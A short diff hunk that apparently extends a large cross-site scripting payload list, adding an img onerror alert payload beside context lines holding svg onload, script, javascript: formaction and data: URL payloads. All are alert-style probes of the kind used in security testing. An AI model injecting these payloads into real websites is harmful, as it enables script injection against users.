@@ -6604,3 +6604,4 @@ feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+'
 <svg onload=(alert)(1)>
 <script>$=1,alert($)</script>
 <form><button formaction="javascript:alert(1)">
+<img src=x onerror="alert('xss')">
